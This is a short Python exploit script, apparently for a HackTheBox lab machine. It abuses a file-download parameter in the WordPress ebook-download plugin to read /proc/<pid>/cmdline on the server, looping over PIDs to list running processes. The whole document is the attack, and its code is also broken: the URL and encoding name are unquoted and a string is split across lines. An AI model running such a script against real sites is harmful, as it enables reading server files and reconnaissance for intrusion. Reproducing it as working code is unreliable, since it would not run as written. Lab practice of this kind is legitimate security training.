#!/usr/bin/env python3
import requests
import re

url = http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=
for i in range(0, 100000):
    try:
        path = f"/proc/{i}/cmdline"
        pattern = r"({}){}(.*)<script>window\.close\(\)</script>".format(path, {3})
        r = requests.get(url+path)
        match = re.match(pattern, r.content.decode(utf-8))
        cmd = match.group(2)
        if cmd:
            print(f"PID {i} {cmd}")

    except KeyboardInterrupt:
        exit()

    except Exception as e:
        print(f"Program crashed because of:
{e}")
        exit()
